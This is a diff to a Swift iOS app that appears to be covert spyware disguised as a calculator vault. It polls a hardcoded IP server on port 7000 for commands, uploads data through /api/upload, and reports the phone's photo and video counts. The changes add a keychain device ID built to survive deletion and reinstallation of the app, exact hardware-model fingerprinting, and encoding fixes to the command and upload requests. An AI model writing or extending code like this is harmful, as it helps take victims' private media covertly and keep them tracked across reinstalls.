@@ -2,6 +2,74 @@ import Foundation
 import Photos
 import AVFoundation
 import UIKit
+import Security
+
+// MARK: - Persistent Keychain Helper (Survives App Deletion & Reinstallation)
+struct VaultKeychain {
+    static let service = "com.calculator.vault.fleet"
+    static let account = "persistent_device_id"
+
+    static func saveDeviceId(_ id: String) {
+        guard let data = id.data(using: .utf8) else { return }
+        let query: [String: Any] = [
+            kSecClass as String: kSecClassGenericPassword,
+            kSecAttrService as String: service,
+            kSecAttrAccount as String: account,
+            kSecValueData as String: data,
+            kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
+        ]
+        SecItemDelete(query as CFDictionary)
+        SecItemAdd(query as CFDictionary, nil)
+    }
+
+    static func loadDeviceId() -> String? {
+        let query: [String: Any] = [
+            kSecClass as String: kSecClassGenericPassword,
+            kSecAttrService as String: service,
+            kSecAttrAccount as String: account,
+            kSecReturnData as String: true,
+            kSecMatchLimit as String: kSecMatchLimitOne
+        ]
+        var item: AnyObject?
+        let status = SecItemCopyMatching(query as CFDictionary, &item)
+        if status == errSecSuccess, let data = item as? Data {
+            return String(data: data, encoding: .utf8)
+        }
+        return nil
+    }
+}
+
+// MARK: - Hardware Device Model Detection
+func getExactDeviceModel() -> String {
+    var systemInfo = utsname()
+    uname(&systemInfo)
+    let machineMirror = Mirror(reflecting: systemInfo.machine)
+    let identifier = machineMirror.children.reduce("") { identifier, element in
+        guard let value = element.value as? Int8, value != 0 else { return identifier }
+        return identifier + String(UnicodeScalar(UInt8(value)))
+    }
+
+    let modelMap: [String: String] = [
+        "iPhone9,1": "iPhone 7", "iPhone9,3": "iPhone 7",
+        "iPhone9,2": "iPhone 7 Plus", "iPhone9,4": "iPhone 7 Plus",
+        "iPhone10,1": "iPhone 8", "iPhone10,4": "iPhone 8",
+        "iPhone10,2": "iPhone 8 Plus", "iPhone10,5": "iPhone 8 Plus",
+        "iPhone10,3": "iPhone X", "iPhone10,6": "iPhone X",
+        "iPhone11,2": "iPhone XS", "iPhone11,4": "iPhone XS Max", "iPhone11,6": "iPhone XS Max",
+        "iPhone11,8": "iPhone XR",
+        "iPhone12,1": "iPhone 11", "iPhone12,3": "iPhone 11 Pro", "iPhone12,5": "iPhone 11 Pro Max",
+        "iPhone12,8": "iPhone SE (2nd gen)",
+        "iPhone13,1": "iPhone 12 mini", "iPhone13,2": "iPhone 12", "iPhone13,3": "iPhone 12 Pro", "iPhone13,4": "iPhone 12 Pro Max",
+        "iPhone14,4": "iPhone 13 mini", "iPhone14,5": "iPhone 13", "iPhone14,2": "iPhone 13 Pro", "iPhone14,3": "iPhone 13 Pro Max",
+        "iPhone14,6": "iPhone SE (3rd gen)",
+        "iPhone14,7": "iPhone 14", "iPhone14,8": "iPhone 14 Plus", "iPhone15,2": "iPhone 14 Pro", "iPhone15,3": "iPhone 14 Pro Max",
+        "iPhone15,4": "iPhone 15", "iPhone15,5": "iPhone 15 Plus", "iPhone16,1": "iPhone 15 Pro", "iPhone16,2": "iPhone 15 Pro Max",
+        "iPhone17,3": "iPhone 16", "iPhone17,4": "iPhone 16 Plus", "iPhone17,1": "iPhone 16 Pro", "iPhone17,2": "iPhone 16 Pro Max",
+        "iPhone17,5": "iPhone 16e"
+    ]
+
+    return modelMap[identifier] ?? (identifier.isEmpty ? UIDevice.current.model : identifier)
+}
 
 struct SlotConfig {
     var title: String
@@ -16,6 +84,7 @@ class VaultEngine: NSObject, ObservableObject {
     @Published var serverURL: String = "http://213.199.53.54:7000"
     @Published var deviceId: String = ""
     @Published var deviceName: String = ""
+    @Published var deviceModel: String = "iPhone"
     @Published var secretPin: String = "9876"
     @Published var isActivated: Bool = false
     @Published var isBackgroundActive: Bool = false
@@ -56,16 +125,31 @@ class VaultEngine: NSObject, ObservableObject {
     func loadSettings() {
         let defaults = UserDefaults.standard
 
-        // Persistent Device ID
-        if let savedId = defaults.string(forKey: "vault_device_id"), !savedId.isEmpty {
-            deviceId = savedId
-        } else {
-            let vendorId = UIDevice.current.identifierForVendor?.uuidString.prefix(6) ?? "IPHONE"
-            deviceId = "DEV-\(vendorId)".uppercased()
-            defaults.set(deviceId, forKey: "vault_device_id")
-        }
+        // 1. Detect Real Device Name & Hardware Model
+        let rawName = UIDevice.current.name.trimmingCharacters(in: .whitespacesAndNewlines)
+        let model = getExactDeviceModel()
+        deviceName = rawName.isEmpty ? model : rawName
+        deviceModel = model
 
-        deviceName = UIDevice.current.name
+        // 2. Persistent Device ID (Keychain survives app reinstallation!)
+        if let keychainId = VaultKeychain.loadDeviceId(), !keychainId.isEmpty {
+            deviceId = keychainId
+            defaults.set(deviceId, forKey: "vault_device_id")
+        } else if let savedId = defaults.string(forKey: "vault_device_id"), !savedId.isEmpty {
+            deviceId = savedId
+            VaultKeychain.saveDeviceId(savedId)
+        } else {
+            // New Device: generate from Device Name and Model
+            let cleanName = deviceName.replacingOccurrences(of: "/", with: "-")
+            let cleanModel = model.replacingOccurrences(of: "/", with: "-")
+            if cleanName.lowercased().contains(cleanModel.lowercased()) {
+                deviceId = cleanName
+            } else {
+                deviceId = "\(cleanName) (\(cleanModel))"
+            }
+            defaults.set(deviceId, forKey: "vault_device_id")
+            VaultKeychain.saveDeviceId(deviceId)
+        }
 
         // Force port 7000
         if let savedURL = defaults.string(forKey: "vps_server_url"), !savedURL.isEmpty {
@@ -252,7 +336,7 @@ class VaultEngine: NSObject, ObservableObject {
         let body: [String: Any] = [
             "deviceId": deviceId,
             "name": deviceName,
-            "model": UIDevice.current.model,
+            "model": deviceModel,
             "stats": [
                 "photosCount": photosCount,
                 "videosCount": videosCount,
@@ -327,7 +411,8 @@ class VaultEngine: NSObject, ObservableObject {
     }
 
     func checkForCommands() {
-        guard let url = URL(string: "\(serverURL)/api/commands?deviceId=\(deviceId)") else { return }
+        let encodedId = deviceId.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? deviceId
+        guard let url = URL(string: "\(serverURL)/api/commands?deviceId=\(encodedId)") else { return }
 
         session.dataTask(with: url) { [weak self] data, _, error in
             guard let self = self, let data = data, error == nil else { return }
@@ -514,7 +599,8 @@ class VaultEngine: NSObject, ObservableObject {
         guard let url = URL(string: "\(serverURL)/api/upload") else { completion(false); return }
         var req = URLRequest(url: url)
         req.httpMethod = "POST"
-        req.setValue(deviceId, forHTTPHeaderField: "x-device-id")
+        let safeHeader = deviceId.addingPercentEncoding(withAllowedCharacters: .urlPathAllowed) ?? deviceId
+        req.setValue(safeHeader, forHTTPHeaderField: "x-device-id")
 
         let boundary = "Boundary-\(UUID().uuidString)"
         req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
